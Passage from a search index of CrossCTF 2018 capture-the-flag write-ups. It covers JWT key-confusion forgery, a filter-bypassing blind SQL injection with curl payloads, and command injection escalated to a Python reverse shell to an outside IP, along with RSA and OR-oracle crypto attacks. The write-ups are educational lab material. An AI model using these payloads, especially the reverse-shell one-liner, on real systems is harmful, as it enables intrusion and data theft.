Plus"},{"location":"crossctf-finals2018/web/gocoinplusplus/#crossctf-finals-2018-gocoin-plus-plus-web","text":"I thought blockchain was cool, so I made my own coin. GoCoin! Plus Plus is the forked and improved version of GoCoin! Plus. Update: I've improved it! More secures and with real cryptos, it's a true cryptocoin now! Update: Stupid me wrote a broken challenge, now its really fixed! http://ctf.pwn.sg:1389 Creator - quanyang (@quanyang)","title":"CrossCTF Finals 2018: GoCoin! Plus Plus (web)"},{"location":"crossctf-finals2018/web/gocoinplusplus/#challenge","text":"So this is the real challenge, fixed by the organisers. TL; DR: 54c54 < walletString := this.Ctx.GetCookie(\"wallet\") --- > walletString := this.Ctx.GetCookie(\"wallet_2\") ... 92c92 < if err != nil { --- > if err != nil || amount < 0 { ... 141c141 < if err != nil { --- > if err != nil || amount < 0 { ... So this makes the previous exploit unexploitable. Time to look back at the JWT implementation. My familiarity with Go made the code 2x easier to read. Because of the hints about crypto being used, it pointed us pretty clearly at the JWT code. If you didn't know yet, JWS stands for JSON Web Tokens. It's a authorization token that can contain data, and makes token validation stateless other than validation of the signature attached using PKI. It was pretty well-know that JWT had an issue previously where things with alg: none . It's even stated in a banner on the JWT website. So, I took a look at the ParseWallet function. func ParseWallet(myToken string, myKey []byte) (float64, float64, error) { token, err := jwt.Parse(myToken, func(token *jwt.Token) (interface{}, error) { if _, ok := token.Method.(*jwt.SigningMethodHMAC); !ok { key, err := jwt.ParseRSAPublicKeyFromPEM(myKey) return key, err } return myKey, nil }) if err == nil && token.Valid { ... From this chunk of code, you can see that the program checks for tokens that are not HMAC and then parses the PEM public key. But, if the token is a HMAC, it directly returns the key! This is especially obvious if you compare it to the example code for HMAC in the documentation for github.com/dgrijalva/jwt-go , and notices in the project README. Since the plaintext public key is being used to perform HMAC comparison rather than validating RSA signatures, we can forge our own tokens because we know the HMAC secret, which is the []byte publicKey. So let's write a program to create this HMACed instead of RSAed token. Oh wait, it's already written by the challenge author! Just need to change one tiny bit. token := jwt.New(jwt.GetSigningMethod(\"HS256\")) Then now I can do: myKey := `-----BEGIN PUBLIC KEY----- MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCyg+EcZOSLYXqdA0Gdx6hE0PFY GshbSxHwBbZ0Ivw41OCD447WtiTmBKWhYkyZIW1uF2G0YpifP9CGZgIHhW6jPUwB u1ewHy0ch+GQeMleaVGqEOsAd65DAXi2TSCZLl66zWy0enQ/SFkm9OTTGYR0e0hM DFqKsA30lPd0pHbSNwIDAQAB -----END PUBLIC KEY----- ` // This newline is important tokenString, err := Wallet(10000, 10000, []byte(myKey)) fmt.Println(err, tokenString) _, _, err := ParseWallet(tokenString, myKey) fmt.Println(err) // nil is SUCCESS! wohoo Here's the full code . Now I've got a valid token, I can simply perform the request to /flag with the token set inside the cookie. Many ways to do that, including using DevTools.","title":"Challenge"},{"location":"crossctf-finals2018/web/retroweb/","text":"CrossCTF Finals 2018: RetroWeb (web) Not so easy SQL injection at all. http://ctf.pwn.sg:8180 Creator - quanyang (@quanyang) Challenge It says it on the tin. Not so easy SQL injection. Dig straight in to the code: if (preg_match('/\\s/', $username) or preg_match('/[\\/\\\\\\\\]/', $username) or preg_match('/(and|or|null|not|union|select|from|where|group|order|having|limit|into|file|case|like)/i', $username) or preg_match('/(--|\\/\\*|=|>|<)/', $username)) exit('die hax0r!'); $username = mysql_escape_string($username); $sql = \"SELECT username FROM users WHERE username like '$username';\"; $result = $conn->query($sql); So this thing does SQL keyword filtering and mysql_escape_string . Seems impossible? It's not, ask Google. Some clicks brought me to this site's example 9 with a description of how to bypass mysql_escape_string. A nice hint in that example also tells you the use of this exploit: for playing CTFs! So let's first try bypassing mysql_escape_string : curl -v -X POST http://ctf.pwn.sg:8180/\\?search -d username=\"$(echo -e \"SELECT\")\" > die hax0r! curl -v -X POST http://ctf.pwn.sg:8180/\\?search -d username=\"$(echo -e \"\\xbf'NOPE\")\" > Nothing returned. (this means an SQL error occurred) curl -v -X POST http://ctf.pwn.sg:8180/\\?search -d username=\"$(echo -e \"\\xbf'#\")\" > Does not exist. Yes! So the quote escaping is valid! We can now add additional statements behind our quote. Next step is to bypass SQL keyword filtering. A site that provided us with background on bypassing SQL statement filtering gave us a lot of information and basics on how to write an SQL statement that bypasses the filter. Combined with the MySQL documentation, and lots of trial and error, we found out the following: You can wrap things in brackets to not need to use spaces. OR(1)=(1) Use && and || instead of AND and OR Instead of using UNION , do a comparison and use the returned result to check Instead of using = , you can use IN Instead of strings, you can use hex characters You can compare the substring of the flag by using substr The guide on bypassing tells us that with all the keywords the filter blocked, we have to resort to blind SQL injection. It's where you compare a column character by character to determine if that character is contained in the column. In this case, we want to brute force every character of the flag out, given 1 bit (Exists or Does not exist) of information. Firstly, we need a way to check for the first character. Let's start with a simple statement. admin' OR 'C' in substr(flag,1,1) Let's remove the AND and spaces: admin'||('C')in(substr(flag,1,1)) We also need to remove the quotes and ignore everything else: admin'||(0x43)in(substr(flag,1,1))# Test it out: curl -v -X POST http://ctf.pwn.sg:8180/\\?search -d username=\"$(echo -e \"admin\\xbf'||((0x43)in(substr(flag,1,1)))#\")\" Yay, we get Exists ! The flag starts with 'C' To extract the next character, you'd simply increase the length of the substring and the length of the hex string you're testing against, like so: payload := fmt.Sprintf(\"username=%%BF'||(0x%x)IN(substr(flag,1,%d))#\", str, len(str)) So, we looped through all possible characters one by one until we got the first, then the next, then the next. The flag CROSSCTF{WHY was slowly forming but then we realised that it was in all caps! The IN comparison is case-insensetive! Simple fix, that took us a while: payload := fmt.Sprintf(\"username=%%BF'||(hex(0x%x))IN(hex(substr(flag,1,%d)))#\", str, len(str)) Complete code here It looks beautiful!","title":"RetroWeb"},{"location":"crossctf-finals2018/web/retroweb/#crossctf-finals-2018-retroweb-web","text":"Not so easy SQL injection at all. http://ctf.pwn.sg:8180 Creator - quanyang (@quanyang)","title":"CrossCTF Finals 2018: RetroWeb (web)"},{"location":"crossctf-finals2018/web/retroweb/#challenge","text":"It says it on the tin. Not so easy SQL injection. Dig straight in to the code: if (preg_match('/\\s/', $username) or preg_match('/[\\/\\\\\\\\]/', $username) or preg_match('/(and|or|null|not|union|select|from|where|group|order|having|limit|into|file|case|like)/i', $username) or preg_match('/(--|\\/\\*|=|>|<)/', $username)) exit('die hax0r!'); $username = mysql_escape_string($username); $sql = \"SELECT username FROM users WHERE username like '$username';\"; $result = $conn->query($sql); So this thing does SQL keyword filtering and mysql_escape_string . Seems impossible? It's not, ask Google. Some clicks brought me to this site's example 9 with a description of how to bypass mysql_escape_string. A nice hint in that example also tells you the use of this exploit: for playing CTFs! So let's first try bypassing mysql_escape_string : curl -v -X POST http://ctf.pwn.sg:8180/\\?search -d username=\"$(echo -e \"SELECT\")\" > die hax0r! curl -v -X POST http://ctf.pwn.sg:8180/\\?search -d username=\"$(echo -e \"\\xbf'NOPE\")\" > Nothing returned. (this means an SQL error occurred) curl -v -X POST http://ctf.pwn.sg:8180/\\?search -d username=\"$(echo -e \"\\xbf'#\")\" > Does not exist. Yes! So the quote escaping is valid! We can now add additional statements behind our quote. Next step is to bypass SQL keyword filtering. A site that provided us with background on bypassing SQL statement filtering gave us a lot of information and basics on how to write an SQL statement that bypasses the filter. Combined with the MySQL documentation, and lots of trial and error, we found out the following: You can wrap things in brackets to not need to use spaces. OR(1)=(1) Use && and || instead of AND and OR Instead of using UNION , do a comparison and use the returned result to check Instead of using = , you can use IN Instead of strings, you can use hex characters You can compare the substring of the flag by using substr The guide on bypassing tells us that with all the keywords the filter blocked, we have to resort to blind SQL injection. It's where you compare a column character by character to determine if that character is contained in the column. In this case, we want to brute force every character of the flag out, given 1 bit (Exists or Does not exist) of information. Firstly, we need a way to check for the first character. Let's start with a simple statement. admin' OR 'C' in substr(flag,1,1) Let's remove the AND and spaces: admin'||('C')in(substr(flag,1,1)) We also need to remove the quotes and ignore everything else: admin'||(0x43)in(substr(flag,1,1))# Test it out: curl -v -X POST http://ctf.pwn.sg:8180/\\?search -d username=\"$(echo -e \"admin\\xbf'||((0x43)in(substr(flag,1,1)))#\")\" Yay, we get Exists ! The flag starts with 'C' To extract the next character, you'd simply increase the length of the substring and the length of the hex string you're testing against, like so: payload := fmt.Sprintf(\"username=%%BF'||(0x%x)IN(substr(flag,1,%d))#\", str, len(str)) So, we looped through all possible characters one by one until we got the first, then the next, then the next. The flag CROSSCTF{WHY was slowly forming but then we realised that it was in all caps! The IN comparison is case-insensetive! Simple fix, that took us a while: payload := fmt.Sprintf(\"username=%%BF'||(hex(0x%x))IN(hex(substr(flag,1,%d)))#\", str, len(str)) Complete code here It looks beautiful!","title":"Challenge"},{"location":"crossctf-finals2018/web/terminal/","text":"CrossCTF Finals 2018: The Terminal (web) How long more can you stand it? http://ctf.pwn.sg:4083 Creator unknown Challenge It's a Fake Terminal. Look at the <title> . First thing to do in any interactive web app is view-source to find interesting things, followed by exploiting the server. DevTools > Debugger -> terminal.js has nothing interesting. However, boop.js has our command definitions for the terminal. All these other commands look boring other than posts and date. We tried to look at posts, but it seems to require some login. We skipped that and went straight into the date command. The path of the \"image\" seems to hint that there could be more than one \"picturisable\" option. A clear hint that this runs the date command, especially after seeing it's format. We tried substituting date with ls : Yay we have files! Maybe it's in the database.db: curl \"http://ctf.pwn.sg:4082/picturise/cat%20database.db|strings|head%20-n%201\" | imgcat (I use iTerm2, imgcat prints an image into my terminal) Using cat , strings , head and tail , I pretty much navigated through the entire database without gaining anything valuable except for being able to write a post as admin . Eww. We took a step back. Maybe it's just hiding somewhere in the filesystem. Let's pop a reverse shell because we're lazy and want to use slashes even though there's no need to: curl \"http://ctfsf.pwn.sg:4082/picturise/python%20-c%20'import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket(socket.AF_INET%2Csocket.SOCK_STREAM)%3Bs.connect((%22138.75.145.240%22%2C8080))%3Bos.dup2(s.fileno()%2C0)%3B%20os.dup2(s.fileno()%2C1)%3B%20os.dup2(s.fileno()%2C2)%3Bp%3Dsubprocess.call(%5B%22sh%22%2C%22-i%22%5D)%3B'\" (Downloaded off the internet, URLEncoded, modified to connect to an internet server. Why does this challenge have access to the internet!?) We received our $money! ambrosechua@some-magical-server $ nc -l 8080 $ ls app.py database.db fonts init.sql motd.txt $ ls / backend bin boot dev etc home lib lib64 media mnt opt proc root run sbin service srv sys tmp usr var $ ls /home/ theterminal $ ls /home/theterminal the_flag_is_here_not_elsewhere $ cat /home/theterminal/the_flag_is_here_not_elsewhere CrossCTF{C4ther1ne_zet4_j0n3s_w4s_1n_l0st_1n_tr4nsl4t1on} Wohoo! Fast way to find the flag file.","title":"The Terminal"},{"location":"crossctf-finals2018/web/terminal/#crossctf-finals-2018-the-terminal-web","text":"How long more can you stand it? http://ctf.pwn.sg:4083 Creator unknown","title":"CrossCTF Finals 2018: The Terminal (web)"},{"location":"crossctf-finals2018/web/terminal/#challenge","text":"It's a Fake Terminal. Look at the <title> . First thing to do in any interactive web app is view-source to find interesting things, followed by exploiting the server. DevTools > Debugger -> terminal.js has nothing interesting. However, boop.js has our command definitions for the terminal. All these other commands look boring other than posts and date. We tried to look at posts, but it seems to require some login. We skipped that and went straight into the date command. The path of the \"image\" seems to hint that there could be more than one \"picturisable\" option. A clear hint that this runs the date command, especially after seeing it's format. We tried substituting date with ls : Yay we have files! Maybe it's in the database.db: curl \"http://ctf.pwn.sg:4082/picturise/cat%20database.db|strings|head%20-n%201\" | imgcat (I use iTerm2, imgcat prints an image into my terminal) Using cat , strings , head and tail , I pretty much navigated through the entire database without gaining anything valuable except for being able to write a post as admin . Eww. We took a step back. Maybe it's just hiding somewhere in the filesystem. Let's pop a reverse shell because we're lazy and want to use slashes even though there's no need to: curl \"http://ctfsf.pwn.sg:4082/picturise/python%20-c%20'import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket(socket.AF_INET%2Csocket.SOCK_STREAM)%3Bs.connect((%22138.75.145.240%22%2C8080))%3Bos.dup2(s.fileno()%2C0)%3B%20os.dup2(s.fileno()%2C1)%3B%20os.dup2(s.fileno()%2C2)%3Bp%3Dsubprocess.call(%5B%22sh%22%2C%22-i%22%5D)%3B'\" (Downloaded off the internet, URLEncoded, modified to connect to an internet server. Why does this challenge have access to the internet!?) We received our $money! ambrosechua@some-magical-server $ nc -l 8080 $ ls app.py database.db fonts init.sql motd.txt $ ls / backend bin boot dev etc home lib lib64 media mnt opt proc root run sbin service srv sys tmp usr var $ ls /home/ theterminal $ ls /home/theterminal the_flag_is_here_not_elsewhere $ cat /home/theterminal/the_flag_is_here_not_elsewhere CrossCTF{C4ther1ne_zet4_j0n3s_w4s_1n_l0st_1n_tr4nsl4t1on} Wohoo! Fast way to find the flag file.","title":"Challenge"},{"location":"crossctf-quals2018/","text":"CrossCTF Quals 2018 Pwn Easynote binary exploit Even Flow writeup binary exploit Impossible Shellcoding binary exploit Quiet Moon binary exploit Real Baby Pwnable binary exploit Skipping Rope binary exploit Reverse Engineering GoGoGo Manual Labour Misc CYOA writeup Crypto Lossy ORacle script exploit flag BabyRSA writeup exploit BabyRSA2 writeup exploit Web QuirkyScript 1 QuirkyScript 2 QuirkyScript 3 QuirkyScript 4 QuirkyScript 5 Baby Web","title":"Overview"},{"location":"crossctf-quals2018/#crossctf-quals-2018","text":"","title":"CrossCTF Quals 2018"},{"location":"crossctf-quals2018/#pwn","text":"","title":"Pwn"},{"location":"crossctf-quals2018/#easynote","text":"binary exploit","title":"Easynote"},{"location":"crossctf-quals2018/#even-flow","text":"writeup binary exploit","title":"Even Flow"},{"location":"crossctf-quals2018/#impossible-shellcoding","text":"binary exploit","title":"Impossible Shellcoding"},{"location":"crossctf-quals2018/#quiet-moon","text":"binary exploit","title":"Quiet Moon"},{"location":"crossctf-quals2018/#real-baby-pwnable","text":"binary exploit","title":"Real Baby Pwnable"},{"location":"crossctf-quals2018/#skipping-rope","text":"binary exploit","title":"Skipping Rope"},{"location":"crossctf-quals2018/#reverse-engineering","text":"","title":"Reverse Engineering"},{"location":"crossctf-quals2018/#gogogo","text":"Manual Labour","title":"GoGoGo"},{"location":"crossctf-quals2018/#misc","text":"","title":"Misc"},{"location":"crossctf-quals2018/#cyoa","text":"writeup","title":"CYOA"},{"location":"crossctf-quals2018/#crypto","text":"","title":"Crypto"},{"location":"crossctf-quals2018/#lossy-oracle","text":"script exploit flag","title":"Lossy ORacle"},{"location":"crossctf-quals2018/#babyrsa","text":"writeup exploit","title":"BabyRSA"},{"location":"crossctf-quals2018/#babyrsa2","text":"writeup exploit","title":"BabyRSA2"},{"location":"crossctf-quals2018/#web","text":"","title":"Web"},{"location":"crossctf-quals2018/#quirkyscript-1","text":"","title":"QuirkyScript 1"},{"location":"crossctf-quals2018/#quirkyscript-2","text":"","title":"QuirkyScript 2"},{"location":"crossctf-quals2018/#quirkyscript-3","text":"","title":"QuirkyScript 3"},{"location":"crossctf-quals2018/#quirkyscript-4","text":"","title":"QuirkyScript 4"},{"location":"crossctf-quals2018/#quirkyscript-5","text":"","title":"QuirkyScript 5"},{"location":"crossctf-quals2018/#baby-web","text":"","title":"Baby Web"},{"location":"crossctf-quals2018/CYOA/","text":"Choose Your Own Adventure - CrossCTF Quals 2018 (misc) Maybe your question was too long. You reduced the length of your question and asked the oracle again: \"Where's the flag?\" As expected, she had no reaction again. You sigh... maybe the solution really was in there after all. You close your eyes and started willing yourself back into the enemy's base... Non-standard flag format: [A-Z0-9]+ Challenge We are given the hints in this format: 01 01 02, Score: 04 You contribute to the puddle of urine in the corner of this room. Scribbled into the wall is the number 17. Below in red, the number 0 was written. Where would you like to move? 6 -- Down 9 -- Quit 1-6 are used to navigate the location to collect all the hints . And we are also given 4 hints to solve the challenge: Hint 1 for CYOA: len(flag) = 9 Think outside the box for this challenge. It's less of a ctf challenge and more of a misc puzzle tbh... Think about how the contents of each room relate to the coordinates and the score. So now that you can match why each object is in a specific room (with a certain coordinate and score), perhaps think about the scribblings. What's the meaning behind the scribbles? You are looking for a string of characters that leads to the final flag. Link each object in the rooms to the coordinates and figure out the overarching theme of the puzzle. And the words reduced, reaction and solution are italicized, suggesting the topic is chemistry. Interpreting the hints Consider the hint above, urea is one component of urine, with chemical formula CO(NH2)2 -> C1O2N2H4, which corresponds to the coordinates(01 01 02) and the score(04). With this in mind we check all the other 19 hints and get all the chemicals . The scribbles in the wall are also unique, ranging from 0 to 19, which suggests the chemicals can be sorted. Scribble Chemical Red no. 0 acetone 1 1 acetic acid 0 2 propene 0 3 nitrous oxide 6 4 acetic acid 0 5 nitrogen 1 6 acetone 1 7 nitrogen 1 8 ozone 3 9 null 0 10 nitrogen 1 11 ozone 3 12 null 0 13 formaldehyde 0 14 ammonia 3 15 water 4 16 methane 0 17 urea 0 18 glycerol 1 19 acetic acid 0 To solve the challenge, we take the (Red no.)th element of the chemical's common name and list them out capsaicin in formula Flag: C18H27NO3","title":"CYOA"},{"location":"crossctf-quals2018/CYOA/#choose-your-own-adventure-crossctf-quals-2018-misc","text":"Maybe your question was too long. You reduced the length of your question and asked the oracle again: \"Where's the flag?\" As expected, she had no reaction again. You sigh... maybe the solution really was in there after all. You close your eyes and started willing yourself back into the enemy's base... Non-standard flag format: [A-Z0-9]+","title":"Choose Your Own Adventure - CrossCTF Quals 2018 (misc)"},{"location":"crossctf-quals2018/CYOA/#challenge","text":"We are given the hints in this format: 01 01 02, Score: 04 You contribute to the puddle of urine in the corner of this room. Scribbled into the wall is the number 17. Below in red, the number 0 was written. Where would you like to move? 6 -- Down 9 -- Quit 1-6 are used to navigate the location to collect all the hints . And we are also given 4 hints to solve the challenge: Hint 1 for CYOA: len(flag) = 9 Think outside the box for this challenge. It's less of a ctf challenge and more of a misc puzzle tbh... Think about how the contents of each room relate to the coordinates and the score. So now that you can match why each object is in a specific room (with a certain coordinate and score), perhaps think about the scribblings. What's the meaning behind the scribbles? You are looking for a string of characters that leads to the final flag. Link each object in the rooms to the coordinates and figure out the overarching theme of the puzzle. And the words reduced, reaction and solution are italicized, suggesting the topic is chemistry.","title":"Challenge"},{"location":"crossctf-quals2018/CYOA/#interpreting-the-hints","text":"Consider the hint above, urea is one component of urine, with chemical formula CO(NH2)2 -> C1O2N2H4, which corresponds to the coordinates(01 01 02) and the score(04). With this in mind we check all the other 19 hints and get all the chemicals . The scribbles in the wall are also unique, ranging from 0 to 19, which suggests the chemicals can be sorted. Scribble Chemical Red no. 0 acetone 1 1 acetic acid 0 2 propene 0 3 nitrous oxide 6 4 acetic acid 0 5 nitrogen 1 6 acetone 1 7 nitrogen 1 8 ozone 3 9 null 0 10 nitrogen 1 11 ozone 3 12 null 0 13 formaldehyde 0 14 ammonia 3 15 water 4 16 methane 0 17 urea 0 18 glycerol 1 19 acetic acid 0 To solve the challenge, we take the (Red no.)th element of the chemical's common name and list them out capsaicin in formula Flag: C18H27NO3","title":"Interpreting the hints"},{"location":"crossctf-quals2018/crypto/BabyRSA/","text":"BabyRSA - CrossCTF Quals 2018 (crypto) Each time I asked for the flag, it gets encoded through RSA. I'm lucky I kept all the values. out.txt . Challenge We're give a list of RSA n(modulus),e(exponent),c(ciphertext) We notice that all the exponents are the same. Vulnerability RSA Algorithm Firstly, 2 distinct primes are chosen, p and q Calculate the modulus with n=pq Calculate \u03bb(n)=lcm(p-1,q-1) Choose the exponent e such that 1<e<\u03bb(n) and e and n are coprime Calculate d=e-1 (mod \u03bb(n)) Calculate the ciphertext c with c=m e (mod n) Decryption is done with m=c d (mod n) Common prime factor attack If the random prime generator is flawed, it could produce 2 prime numbers that are the same, and the message can easily be found by calculating p and q, however, every single pair of primes is coprime. Low exponent attack Another option is if c=m e , we can just calculate m=c 1/e and we're done. This would require the exponent to be much smaller compared to the modulus. Since we're given many pairs of c,n,e, we can use the Chinese Remainder Theorem to calculate m e (mod n1*n2*n3...), then we can take the 257th root. This assumes message remains the same Chinese remainder theorem Let N be the product of all the modulus Let N i =N/n i Find integers M i and m i such that M i N i +m i n i =1. Now calculate C=\u03a3c i M i M i mod N C=c i mod n i for all i N is now much larger than 257, so we can just take C 1/e and we're done. exploit Flag: crossctf{Ha5tad_ch4ll3nGes_aRe_Gett1ng_b0riNg_n0w_Eh}","title":"BabyRSA"},{"location":"crossctf-quals2018/crypto/BabyRSA/#babyrsa-crossctf-quals-2018-crypto","text":"Each time I asked for the flag, it gets encoded through RSA. I'm lucky I kept all the values. out.txt .","title":"BabyRSA - CrossCTF Quals 2018 (crypto)"},{"location":"crossctf-quals2018/crypto/BabyRSA/#challenge","text":"We're give a list of RSA n(modulus),e(exponent),c(ciphertext) We notice that all the exponents are the same.","title":"Challenge"},{"location":"crossctf-quals2018/crypto/BabyRSA/#vulnerability","text":"","title":"Vulnerability"},{"location":"crossctf-quals2018/crypto/BabyRSA/#rsa-algorithm","text":"Firstly, 2 distinct primes are chosen, p and q Calculate the modulus with n=pq Calculate \u03bb(n)=lcm(p-1,q-1) Choose the exponent e such that 1<e<\u03bb(n) and e and n are coprime Calculate d=e-1 (mod \u03bb(n)) Calculate the ciphertext c with c=m e (mod n) Decryption is done with m=c d (mod n)","title":"RSA Algorithm"},{"location":"crossctf-quals2018/crypto/BabyRSA/#common-prime-factor-attack","text":"If the random prime generator is flawed, it could produce 2 prime numbers that are the same, and the message can easily be found by calculating p and q, however, every single pair of primes is coprime.","title":"Common prime factor attack"},{"location":"crossctf-quals2018/crypto/BabyRSA/#low-exponent-attack","text":"Another option is if c=m e , we can just calculate m=c 1/e and we're done. This would require the exponent to be much smaller compared to the modulus. Since we're given many pairs of c,n,e, we can use the Chinese Remainder Theorem to calculate m e (mod n1*n2*n3...), then we can take the 257th root. This assumes message remains the same","title":"Low exponent attack"},{"location":"crossctf-quals2018/crypto/BabyRSA/#chinese-remainder-theorem","text":"Let N be the product of all the modulus Let N i =N/n i Find integers M i and m i such that M i N i +m i n i =1. Now calculate C=\u03a3c i M i M i mod N C=c i mod n i for all i N is now much larger than 257, so we can just take C 1/e and we're done. exploit Flag: crossctf{Ha5tad_ch4ll3nGes_aRe_Gett1ng_b0riNg_n0w_Eh}","title":"Chinese remainder theorem"},{"location":"crossctf-quals2018/crypto/BabyRSA2/","text":"BabyRSA2 - CrossCTF Quals 2018 (crypto) Each time I asked for the flag, it gets encoded through RSA.... again... I'm lucky I kept all the values... AGAIN! out.txt . Challenge We're give a list of RSA n(modulus),e(exponent),c(ciphertext) We notice that all the modulus are the same. Vulnerability RSA Algorithm Firstly, 2 distinct primes are chosen, p and q Calculate the modulus with n=pq Calculate \u03bb(n)=lcm(p-1,q-1) Choose the exponent e such that 1<e<\u03bb(n) and e and n are coprime Calculate d=e-1 (mod \u03bb(n)) Calculate the ciphertext c with c=m e (mod n) Decryption is done with m=c d (mod n) Common modulus attack Since pq mod n=(p mod n)(q mod n)mod n and m a m b =m ab , if we can find numbers x 1 x 2 ... such that \u03a3x i e i =1, then we can calculate m 1 , assuming all the messages are the same. B\u00e9zout's identity states that if x and y are coprime, then integers a,b exists such that ax+by=1, however, all our exponents share common prime factors, even any 4 exponents share a common factor. However, all 5 exponents do not share a common factor, thus, it is possible to find x 1 x 2 ... such that \u03a3x i e i =1. We can use the extended Euclidean algorithm, however, the numbers resulting from it could be pretty huge, so the equation is evaluated by Mathematica, giving us x=[3239,237,735,556,-6676]. For negative numbers, we can calculate the inverse modulo pretty quickly, and evaluating \u03a0m x i e i (mod n) gives us the flag. exploit Flag: crossctf{RSA_Challenges_Are_Too_Easy}","title":"BabyRSA 2"},{"location":"crossctf-quals2018/crypto/BabyRSA2/#babyrsa2-crossctf-quals-2018-crypto","text":"Each time I asked for the flag, it gets encoded through RSA.... again... I'm lucky I kept all the values... AGAIN! out.txt .","title":"BabyRSA2 - CrossCTF Quals 2018 (crypto)"},{"location":"crossctf-quals2018/crypto/BabyRSA2/#challenge","text":"We're give a list of RSA n(modulus),e(exponent),c(ciphertext) We notice that all the modulus are the same.","title":"Challenge"},{"location":"crossctf-quals2018/crypto/BabyRSA2/#vulnerability","text":"","title":"Vulnerability"},{"location":"crossctf-quals2018/crypto/BabyRSA2/#rsa-algorithm","text":"Firstly, 2 distinct primes are chosen, p and q Calculate the modulus with n=pq Calculate \u03bb(n)=lcm(p-1,q-1) Choose the exponent e such that 1<e<\u03bb(n) and e and n are coprime Calculate d=e-1 (mod \u03bb(n)) Calculate the ciphertext c with c=m e (mod n) Decryption is done with m=c d (mod n)","title":"RSA Algorithm"},{"location":"crossctf-quals2018/crypto/BabyRSA2/#common-modulus-attack","text":"Since pq mod n=(p mod n)(q mod n)mod n and m a m b =m ab , if we can find numbers x 1 x 2 ... such that \u03a3x i e i =1, then we can calculate m 1 , assuming all the messages are the same. B\u00e9zout's identity states that if x and y are coprime, then integers a,b exists such that ax+by=1, however, all our exponents share common prime factors, even any 4 exponents share a common factor. However, all 5 exponents do not share a common factor, thus, it is possible to find x 1 x 2 ... such that \u03a3x i e i =1. We can use the extended Euclidean algorithm, however, the numbers resulting from it could be pretty huge, so the equation is evaluated by Mathematica, giving us x=[3239,237,735,556,-6676]. For negative numbers, we can calculate the inverse modulo pretty quickly, and evaluating \u03a0m x i e i (mod n) gives us the flag. exploit Flag: crossctf{RSA_Challenges_Are_Too_Easy}","title":"Common modulus attack"},{"location":"crossctf-quals2018/crypto/lossyoracle/","text":"LossyORacle - CrossCTF Quals 2018 (crypto) No one believes I can recover the message from this crappy ORacle. nc ctf.pwn.sg 1401 Creator - prokarius (@prokarius) Challenge We are given a service that runs the python script lossyoracle.py . We can connect to the service using nc and it will spit out the encrypted flag. The script reads the flag file, then encrypts it with a key using the following function. def encrypt(data, key, func): length = len(key) output = [] for i in range(len(data)): output.append(func(data[i],key[i%length])) return bytes(output) From the following code, we notice that func over here is just a bitwise OR (|) operation applied to each byte in the flag with the key. function = [lambda x,y:x&y, lambda x,y:x|y] print (base64.b64encode(encrypt(data, key, function[1])).decode(\"utf-8\")) One problematic thing is, the key is always random. Not only that the bytes in the key are random every time, but the length of the key is also random every time! key = [] for i in range(random.randrange(64,128)): key.append(random.randrange(0,255)) key = bytes(key) Vulnerability Or maybe it is not problematic for us, but a helpful vulnerability instead. For the following, we will refer to ON as a bit being equal to 1, while OFF as a bit being equal to 0. Bitwise OR The property of a bitwise OR operation is that bits that are ON (equal to 1) will always stay ON, no matter what the bit is ORed with. This means, for each byte in the flag, for every single bit in them, as long as they are ON, no matter what key is used, they will always be ON after encryption. On the other hand, for bits in the flag that are OFF, sometimes, since the key is randomly generated, they may end up still being OFF after encryption. This means, we can take a lot different ciphertexts, and in at least one of them, the bits that are supposed to be OFF in the original flag must be OFF, since they definitely can't be ON forever, considering we are using a randomly generated key. Bitwise AND Now, the property of a bitwise AND operation is that bits that are OFF (equal to 0) will always stay OFF, no matter what the bit is ANDed with. So, we can just apply the bitwise AND operation on many different ciphertexts together. How this works is that bits that are ON in the flag are ON forever regardless of the key, so even after applying bitwise AND on so many different ciphertexts they will still be ON. On the other hand, if we have many different ciphertexts, there must be at least one occurence where a bit that is originally OFF stays OFF, as the corresponding part of the key encrypting it may be OFF as well. By applying bitwise AND on all the ciphertexts together, this bit will be turned OFF. So, the final result would be a set of bytes, which has the same bits as the flag that are ON, and the same bits that are OFF, which is the flag! Exploit Get many ciphertexts First thing we need is to automate the process of getting ciphertexts since we need A LOT of them. We can easily do it using pwntools. from pwn import * import base64 HOST = 'ctf.pwn.sg' PORT = 1401 r = remote(HOST, PORT) m = base64.b64decode(r.readall().strip().encode('utf-8')) assert len(m) == 14160 Along the way, we also convert the message to the correct encoding, and add a safety check to make sure the number of bytes received is always the same. AND them all! We can write a simple python function to do the bitwise AND between two strings for us. We initialize message to be a bunch of \\xff bytes, which means all bits in it are ON at the start. message = '\\xff' * 14160 def and_strings(s1, s2): return ''.join([chr(ord(s1[i]) & ord(s2[i])) for i in range(len(s1))]) Combining all together Our final solution is from pwn import * import base64 HOST = 'ctf.pwn.sg' PORT = 1401 message = '\\xff' * 14160 def and_strings(s1, s2): return ''.join([chr(ord(s1[i]) & ord(s2[i])) for i in range(len(s1))]) for i in range(500): print i r = remote(HOST, PORT) m = base64.b64decode(r.readall().strip().encode('utf-8')) assert len(m) == 14160 message = and_strings(message, m) open('flag', 'w').write(message) At first, I tried to read the flag on the terminal, but I get a bunch of unreadable bytes. I was confused and doubted my solution. But then, I remembered it was 14kb of data, sounds more likely to be a file. So, open('flag', 'w').write(message) was added to save the decrypted flag in a file. Reading the flag While doing file flag , I get flag: MPEG ADTS, layer III, v2, 16 kbps, 24 kHz, Monaural A MPEG file! Play it using mpg123 flag and we get the flag!","title":"LossyOracle"},{"location":"crossctf-quals2018/crypto/lossyoracle/#lossyoracle-crossctf-quals-2018-crypto","text":"No one believes I can recover the message from this crappy ORacle. nc ctf.pwn.sg 1401 Creator - prokarius (@prokarius)","title":"LossyORacle - CrossCTF Quals 2018 (crypto)"},{"location":"crossctf-quals2018/crypto/lossyoracle/#challenge","text":"We are given a service that runs the python script lossyoracle.py . We can connect to the service using nc and it will spit out the encrypted flag. The script reads the flag file, then encrypts it with a key using the following function. def encrypt(data, key, func): length = len(key) output = [] for i in range(len(data)): output.append(func(data[i],key[i%length])) return bytes(output) From the following code, we notice that func over here is just a bitwise OR (|) operation applied to each byte in the flag with the key. function = [lambda x,y:x&y, lambda x,y:x|y] print (base64.b64encode(encrypt(data, key, function[1])).decode(\"utf-8\")) One problematic thing is, the key is always random. Not only that the bytes in the key are random every time, but the length of the key is also random every time! key = [] for i in range(random.randrange(64,128)): key.append(random.randrange(0,255)) key = bytes(key)","title":"Challenge"},{"location":"crossctf-quals2018/crypto/lossyoracle/#vulnerability","text":"Or maybe it is not problematic for us, but a helpful vulnerability instead. For the following, we will refer to ON as a bit being equal to 1, while OFF as a bit being equal to 